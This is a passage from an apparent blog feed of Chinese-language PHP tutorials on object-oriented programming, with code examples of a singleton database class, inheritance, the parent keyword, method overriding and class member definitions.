class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的析构方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;link); <span class="comment">//断开MySQL连接</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;phpshujuku&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db1 = Db::getInstance($arr);</span><br><span class="line">$db2 = Db::getInstance($arr);</span><br><span class="line">var_dump($db1,$db2);</span><br></pre></td></tr></table></figure><h2 id="类的继承性"><a href="#类的继承性" class="headerlink" title="类的继承性"></a>类的继承性</h2><h3 id="什么是类的继承性？"><a href="#什么是类的继承性？" class="headerlink" title="什么是类的继承性？"></a>什么是类的继承性？</h3><p>CSS样式继承：父标签定义的样式，可以在子标签中直接使用。相同的样式只写一遍，减少代码量。</p><p>如果一个B类拥有了A类的所有特征信息，我们就说B类继承了A类。</p><p>A类可以称为：基础类(最顶层的类)、父类、上层类。</p><p>B类可以称为：最终类(最终的类)、子类、下层类。</p><p>提示：如果多个子类拥有相同的属性和方法，可以将相同的属性和方法提取出来，放到“父类”中，然后，再创建子类并继承父类；这样一样，重复的代码只写一遍，减少代码量，提高工作效率。</p><p>为什么要使用类的继承？是为了实现功能的升级和扩展。</p><p>功能的升级：原来有的功能，在子类进行完善。</p><p>功能的扩展：原来没有的功能，在子类增加新功能。</p><h3 id="单继承和多继承"><a href="#单继承和多继承" class="headerlink" title="单继承和多继承"></a>单继承和多继承</h3><p>单继承：只能从一个父类来继承功能。如：Java、PHP、C#等。</p><p>多继承：同时从多个父类来继承功能。如：C++。</p><h3 id="parent关键字"><a href="#parent关键字" class="headerlink" title="parent关键字"></a>parent关键字</h3><p>self代表当前类，parent代表父类。</p><p>self和parent可以存在于所有方法(成员方法和静态方法)中。</p><p>self用来调用本类的内容，包括：类常量、静态属性、静态方法、成员方法；</p><p>parent用来调用父类的内容，包括：类常量、静态属性、静态方法、成员方法；</p><p>self和parent都使用范围解析符”::”来调用其它内容。</p><p>语法：<code>parent::类常量 | 静态属性 | 静态方法 | 成员方法</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个传智学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第70期就业班&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">160</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;父类常量：&quot;</span>.<span class="built_in">parent</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;子类常量：&quot;</span>.<span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;父类静态属性：&quot;</span>.<span class="built_in">parent</span>::$count;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;子类静态属性：&quot;</span>.<span class="built_in">self</span>::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="实例：单继承的简单演示"><a href="#实例：单继承的简单演示" class="headerlink" title="实例：单继承的简单演示"></a>实例：单继承的简单演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;&lt;h2&gt;PHP第69期就业班&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个传智学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$str = <span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;班级人数：&quot;</span>.ItcastStudent::$count;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;姓名：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;静态方法：&quot;</span>.<span class="built_in">self</span>::readMe();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;成员方法：&quot;</span>.<span class="keyword">$this</span>-&gt;showInfo();</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent();</span><br><span class="line">$obj-&gt;abc();</span><br></pre></td></tr></table></figure><h2 id="类的多态"><a href="#类的多态" class="headerlink" title="类的多态"></a>类的多态</h2><h3 id="什么是类的多态？"><a href="#什么是类的多态？" class="headerlink" title="什么是类的多态？"></a>什么是类的多态？</h3><p>类的多态，就是类的多种形态。</p><p>类的多态主要指方法重载或方法重写。</p><p>方法重载：在同一个类中定义两个同名方法，PHP不支持。</p><p>方法重写：在子类中定义一个与父类同名的方法，就是“方法重写”。</p><p>为什么要重写方法？主要是实现功能的升级。父类中有的方法，子类中再用同样的名字再定义一次，一般来说，子类中方法的功能比父类更完善、更详尽。</p><h3 id="方法重写的要求"><a href="#方法重写的要求" class="headerlink" title="方法重写的要求"></a>方法重写的要求</h3><p>子类中重写的方法，要与父类中的方法同名；</p><p>子类中重写的方法形参个数，要与父类中的同名方法形参个数一致；</p><p>子类中重写的方法类型，要与父类中同名方法类型一致；</p><p>子类中重写的方法的访问权限，不能低于父类中同名方法的访问权限；</p><ul><li><p>父类方法权限为public，子类同名方法权限只能是public；</p></li><li><p>父类方法权限为protected，子类同名方法权限可以是protected和public；</p></li><li><p>父类方法权限为private，子类无法继承，也无法重写。</p></li></ul><p>注意：对于重写构造方法，就比较特殊，就没有形参个数的要求。</p><h3 id="实例：商品子类重写商品基础类中的方法"><a href="#实例：商品子类重写商品基础类中的方法" class="headerlink" title="实例：商品子类重写商品基础类中的方法"></a>实例：商品子类重写商品基础类中的方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//实例：类的三大特性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个基础商品类(最顶层)</span></span><br><span class="line"><span class="comment">//基础类是为了继承，不能直接创建对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的商品属性</span></span><br><span class="line"><span class="keyword">private</span> $name;<span class="comment">//商品名称</span></span><br><span class="line"><span class="keyword">private</span> $price;<span class="comment">//商品价格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的构造方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = $name2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;price = $price2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的显示商品方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;商品名称：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;商品价格：<span class="subst">&#123;$this-&gt;price&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建手机类，并继承商品类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mobile</span> <span class="keyword">extends</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的手机属性</span></span><br><span class="line"><span class="keyword">private</span> $pinpai;<span class="comment">//手机品牌</span></span><br><span class="line"><span class="keyword">private</span> $city;<span class="comment">//手机产地</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2,$pinpai2,$city2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//调用父类的构造方法</span></span><br><span class="line"><span class="built_in">parent</span>::__construct($name2,$price2);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pinpai = $pinpai2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;city   = $city2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的showInfo()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">parent</span>::showInfo();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;手机品牌：<span class="subst">&#123;$this-&gt;pinpai&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;手机产地：<span class="subst">&#123;$this-&gt;city&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建图书类，并继承商品类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的图书属性</span></span><br><span class="line"><span class="keyword">private</span> $author;<span class="comment">//作者</span></span><br><span class="line"><span class="keyword">private</span> $publish;<span class="comment">//出版社</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2,$author2,$publish2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//调用父类的构造方法</span></span><br><span class="line"><span class="built_in">parent</span>::__construct($name2,$price2);</span><br><span class="line"><span class="keyword">$this</span>-&gt;author = $author2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;publish= $publish2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的showInfo()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">parent</span>::showInfo();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;作者：<span class="subst">&#123;$this-&gt;author&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;出版社：<span class="subst">&#123;$this-&gt;publish&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建手机类对象</span></span><br><span class="line">$obj1 = <span class="keyword">new</span> Mobile(<span class="string">&#x27;苹果X&#x27;</span>,<span class="number">8888</span>,<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;天津市&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj1-&gt;showInfo();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//创建图书类对象</span></span><br><span class="line">$obj2 = <span class="keyword">new</span> Book(<span class="string">&#x27;PHP从入门到放弃&#x27;</span>,<span class="number">199.00</span>,<span class="string">&#x27;武大郎&#x27;</span>,<span class="string">&#x27;武大烧饼铺&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;showInfo();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP核心编程5&quot;&gt;&lt;a href=&quot;#PHP核心编程5&quot; class=&quot;headerlink&quot; title=&quot;PHP核心编程5&quot;&gt;&lt;/a&gt;PHP核心编程5&lt;/h1&gt;&lt;h2 id=&quot;静态属性和静态方法&quot;&gt;&lt;a href=&quot;#静态属性和静态方法&quot; class=&quot;he</summary>
      
    
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发学习--核心编程4</title>
    <link href="http://s1eady.top/2019/12/12/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B4/"/>
    <id>http://s1eady.top/2019/12/12/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B4/</id>
    <published>2019-12-11T23:29:22.000Z</published>
    <updated>2020-11-15T09:23:38.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP核心编程5"><a href="#PHP核心编程5" class="headerlink" title="PHP核心编程5"></a>PHP核心编程5</h1><h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><h3 id="类的定义语法格式"><a href="#类的定义语法格式" class="headerlink" title="类的定义语法格式"></a>类的定义语法格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的成员属性定义"><a href="#类的成员属性定义" class="headerlink" title="类的成员属性定义"></a>类的成员属性定义</h3><h4 id="成员属性介绍"><a href="#成员属性介绍" class="headerlink" title="成员属性介绍"></a>成员属性介绍</h4><p>类的成员属性，就是指某个类具有的公共的特征、特性；</p><p>类中定义的变量，就是类的成员属性；</p><p>类的成员属性和普通变量的区别：类的成员属性必须要带权限修饰符，而普通变量不需要。</p><h4 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h4><p>成员属性必须要加权限修改符，否则报错。</p><p>public(公共权限)：在任何地方都可以访问，主要包括：类外、本类中、子类中都可以访问。</p><p>private(私有权限)：只能在本类中被访问，在类外和子类中都无权访问。</p><p>protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能被访问。</p><p>举例说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $age=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">protected</span> $steady;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的成员方法定义"><a href="#类的成员方法定义" class="headerlink" title="类的成员方法定义"></a>类的成员方法定义</h3><h4 id="成员方法介绍"><a href="#成员方法介绍" class="headerlink" title="成员方法介绍"></a>成员方法介绍</h4><p>类的方法，就是某个类的公共的的行为或动作；</p><p>类的成员方法，与普通函数一样，都有返回值和参数；</p><p>成员方法与普通函数区别：成员方法只能存在于类中，成员方法定义前可以添加访问权限修饰符；</p><p>提示：成员方法可以省略权限修饰符，默认访问权限是public。</p><p>举例说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建类的实例对象"><a href="#创建类的实例对象" class="headerlink" title="创建类的实例对象"></a>创建类的实例对象</h3><h4 id="实例化对象的含义"><a href="#实例化对象的含义" class="headerlink" title="实例化对象的含义"></a>实例化对象的含义</h4><p>定义类是为了生产对象，如果不生产对象，类就没有意义。</p><p>一个类可以产生千千万万个对象，对象帮我们干活。</p><p>对象实例化：从一个类上来生产对象过程，就是类的实例化。</p><p>语法格式</p><p>使用new关键字来创建对象。</p><p>JS创建对象的方法：var today = new Date()</p><p>PHP创建对象的方法：$obj = new Student()</p><h4 id="对象属性操作"><a href="#对象属性操作" class="headerlink" title="对象属性操作"></a>对象属性操作</h4><h5 id="如何访问对象的属性和方法？"><a href="#如何访问对象的属性和方法？" class="headerlink" title="如何访问对象的属性和方法？"></a>如何访问对象的属性和方法？</h5><p>在PHP中，访问对象属性和方法，是通过”<strong><em>\</em>-&gt;**</strong>“来访问的。例如：$obj-&gt;name、$obj-&gt;showInfo()</p><h5 id="对象属性的操作"><a href="#对象属性的操作" class="headerlink" title="对象属性的操作"></a>对象属性的操作</h5><h5 id="对象方法操作"><a href="#对象方法操作" class="headerlink" title="对象方法操作"></a>对象方法操作</h5><p>对象方法的操作：方法定义、方法调用、传递参数、方法返回值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echo_info</span>(<span class="params">$age,$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        